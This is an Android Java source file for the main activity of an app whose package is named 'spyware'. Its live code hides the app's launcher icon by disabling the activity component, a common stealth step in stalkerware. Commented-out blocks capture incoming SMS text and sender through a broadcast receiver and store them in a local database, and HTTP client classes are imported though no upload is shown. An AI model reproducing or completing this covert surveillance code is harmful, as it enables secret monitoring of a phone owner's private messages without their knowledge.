package com.example.administrator.spyware;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.telephony.SmsMessage;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    TextView tv;
    ListView lv;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });
        PackageManager pkg=this.getPackageManager();
        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        /*tv=(TextView)findViewById(R.id.tv);
        lv=(ListView)findViewById(R.id.lv);
        ArrayList<String> arr=new ArrayList<String>();
        Database db=new Database(this);
        db.Query_Data("CREATE TABLE IF NOT EXISTS thongtin(_id INTEGER PRIMARY KEY,noidung VARCHAR(200) NOT NULL,nguoigui VARCHAR(200) NOT NULL)");
        Cursor kq=db.GetData("SELECT * FROM thongtin");
        while(kq.moveToNext()){
            String s=kq.getString(1);
            arr.add(s);
        }
        ArrayAdapter adapter=new ArrayAdapter(MainActivity.this,android.R.layout.simple_list_item_1,arr);
        lv.setAdapter(adapter);*/
       /* final ArrayList<String> arr=new ArrayList<String>();
        MyBroadcastReceiver Mybroadcast= new MyBroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Bundle bd=intent.getExtras();
                if(bd!=null) {
                    String SmsContent = bd.getString("SmsContent");
                    String SmsFrom=bd.getString("SmsFrom");
                    Database db=new Database(context);
                    db.Query_Data("CREATE TABLE IF NOT EXISTS thongtin(_id INTEGER PRIMARY KEY,noidung VARCHAR(200) NOT NULL,nguoigui VARCHAR(200) NOT NULL)");
                    db.Query_Data("INSERT INTO thongtin VALUES(null,'khang','pro')");
                    Cursor kq=db.GetData("SELECT * FROM thongtin");
                    while(kq.moveToNext()){
                        String s=kq.getString(1);
                        arr.add(s);
                    }
                      ArrayAdapter adapter=new ArrayAdapter(MainActivity.this,android.R.layout.simple_list_item_1,arr);
                     lv.setAdapter(adapter);
                }


            }
        };
       registerReceiver(Mybroadcast,new IntentFilter("broadcast"));*/



    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
